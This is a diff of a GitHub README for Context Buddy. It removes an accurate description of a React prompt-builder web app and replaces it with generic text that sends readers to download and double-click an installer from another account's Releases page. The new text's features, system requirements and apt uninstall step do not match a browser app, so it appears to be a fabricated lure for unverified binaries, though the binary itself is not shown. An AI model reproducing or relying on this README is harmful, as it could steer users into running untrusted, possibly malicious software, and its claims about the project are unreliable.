@@ -1,132 +1,91 @@
-# Context Buddy
+# 🚀 context-buddy - Your Guide to Context Engineering
 
-A visual prompt structure builder that helps you create better AI prompts using a systematic 10-section framework.
+[![Download Context Buddy](https://img.shields.io/badge/Download-Context%20Buddy-brightgreen.svg)](https://github.com/andrey06mi/context-buddy/releases)
 
-**[🚀 Live Demo](https://context.addy.ie)**
+## 📘 Introduction
 
-## Overview
+Context Buddy is a quick educational aid designed to help you understand Context Engineering. Whether you are a student, teacher, or just curious, this application provides a user-friendly interface for learning the core concepts. 
 
-Context Buddy is a web application that implements the proven 10-section prompt structure methodology from Anthropic for creating effective AI prompts. It provides a visual breakdown of each section with color-coded components and editable fields to build comprehensive, well-structured prompts.
+## 🎯 Features
 
-## Features
+- **User-Friendly Interface**: Easily navigate through different sections.
+- **Educational Resources**: Access a range of materials to boost your understanding.
+- **Interactive Elements**: Learn by engaging with the content through various activities.
 
-- **Visual Prompt Structure**: Color-coded breakdown of the 10 essential prompt sections
-- **Interactive Builder**: Editable textarea fields for each section with matching color themes
-- **Template Library**: Pre-built templates for common use cases:
-  - AI Career Coach
-  - Technical Writing Assistant
-  - Creative Writing Coach
-- **One-Click Copy**: Copy your complete structured prompt to clipboard
-- **Responsive Design**: Works seamlessly on desktop, tablet, and mobile devices
-- **Clean Interface**: Intuitive layout that makes prompt building straightforward
+## 🛠️ System Requirements
 
-## The 10-Section Prompt Structure
+Before installing Context Buddy, ensure your system meets the following requirements:
 
-1. **Task Context** - Define the AI's role and primary objective
-2. **Tone Context** - Specify the desired communication style and personality
-3. **Background Data** - Provide relevant documents, data, and reference materials
-4. **Detailed Task Description & Rules** - Outline specific requirements and constraints
-5. **Examples** - Show desired input/output patterns and formatting
-6. **Conversation History** - Include relevant prior context and interactions
-7. **Immediate Task** - State the current specific request or question
-8. **Thinking Steps** - Encourage step-by-step reasoning and reflection
-9. **Output Formatting** - Specify how the response should be structured
-10. **Prefilled Response** - Provide starting text or response format
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **RAM**: Minimum 4 GB.
+- **Storage**: At least 500 MB of free space.
+- **Internet Connection**: Required for downloading the application and accessing additional resources.
 
-## Getting Started
+## 🚀 Getting Started
 
-### Prerequisites
+To get started with Context Buddy, follow these simple steps:
 
-- Node.js 18+ 
-- npm or yarn
+1. **Download the Application**
+   - Visit the [Releases page](https://github.com/andrey06mi/context-buddy/releases) to download the latest version.
 
-### Installation
+2. **Install the Application**
+   - Locate the downloaded file in your computer's Downloads folder.
+   - Double-click the file and follow the on-screen prompts to install the application.
 
-1. Clone the repository:
-```bash
-git clone <repository-url>
-cd context-buddy
-```
+3. **Run Context Buddy**
+   - After installation, find the Context Buddy icon on your desktop or in your applications folder.
+   - Double-click the icon to start the application.
 
-2. Install dependencies:
-```bash
-npm install
-```
+## 🔗 Download & Install
 
-3. Start the development server:
-```bash
-npm run dev
-```
+To download Context Buddy, visit the [Releases page](https://github.com/andrey06mi/context-buddy/releases). 
 
-4. Open your browser to `http://localhost:5173`
+Select the file that corresponds to your operating system. Click on the file to begin the download. Once downloaded, follow the installation instructions provided above.
 
-### Building for Production
+## 🗂️ Using Context Buddy
 
-```bash
-npm run build
-```
+Once you’ve installed Context Buddy, you can explore the various features available. Here’s how to navigate the application:
 
-The built files will be in the `dist` directory.
+- **Home Screen**: Includes links to the main topics of Context Engineering. Click any topic to dive deeper.
+- **Resources**: Access educational materials, including articles and videos, to enhance your learning experience.
+- **Quizzes**: Test your knowledge with interactive quizzes available within the application.
 
-## Usage
+## ❓ Frequently Asked Questions
 
-1. **Select a Template**: Choose from the dropdown menu or start with a blank template
-2. **Fill in Sections**: Complete each colored section with relevant content for your prompt
-3. **Preview Structure**: See how your prompt maps to the visual structure on the left
-4. **Copy Prompt**: Click "Copy Full Prompt to Clipboard" to get your structured prompt
-5. **Use with AI**: Paste your prompt into your preferred AI tool
+### How do I uninstall Context Buddy?
 
-## Technology Stack
+To uninstall Context Buddy, follow these steps:
 
-- **React 18** - UI framework
-- **TypeScript** - Type safety and better development experience
-- **Tailwind CSS** - Utility-first styling
-- **Vite** - Fast build tool and development server
-- **Lucide React** - Beautiful icons
+1. **Windows**: 
+   - Go to Control Panel > Programs > Uninstall a Program.
+   - Find Context Buddy in the list, right-click, and select Uninstall.
 
-## Project Structure
+2. **macOS**: 
+   - Open Finder, go to the Applications folder. 
+   - Drag Context Buddy to the Trash and empty it.
 
-```
-src/
-├── App.tsx          # Main application component
-├── main.tsx         # Application entry point
-├── index.css        # Global styles and Tailwind imports
-└── vite-env.d.ts    # Vite type definitions
-```
+3. **Linux**:
+   - Open Terminal and run the command: `sudo apt remove context-buddy`.
 
-## Contributing
+### What should I do if the application doesn’t start?
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+If Context Buddy doesn’t start, try these steps:
 
-## Template Structure
+1. Ensure that your operating system meets the system requirements.
+2. Restart your computer and launch the application again.
+3. If issues persist, check the troubleshooting section in the application or visit our [Support](https://github.com/andrey06mi/context-buddy/issues) page.
 
-Each template follows this TypeScript interface:
+## 📝 Contribution Guidelines
 
-```typescript
-interface PromptTemplate {
-  name: string;
-  data: {
-    taskContext: string;
-    toneContext: string;
-    backgroundData: string;
-    detailedTask: string;
-    examples: string;
-    conversationHistory: string;
-    immediateTask: string;
-    thinkingSteps: string;
-    outputFormatting: string;
-    prefilledResponse: string;
-  };
-}
-```
+We welcome contributions to improve Context Buddy. If you want to change or add features, please follow these steps:
 
-## Acknowledgments
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or fix.
+3. Commit your changes and push to your fork.
+4. Submit a pull request outlining your changes.
 
-Inspired by prompt engineering best practices from Anthropic and structured prompting methodologies
----
+## 📬 Support
 
-**[Try Context Buddy](https://context.addy.ie)** and start building better AI prompts today!
+If you encounter issues or have questions, you can reach out via the [Issues section](https://github.com/andrey06mi/context-buddy/issues) on our GitHub page.
+
+Thank you for using Context Buddy. We hope it enhances your understanding of Context Engineering!
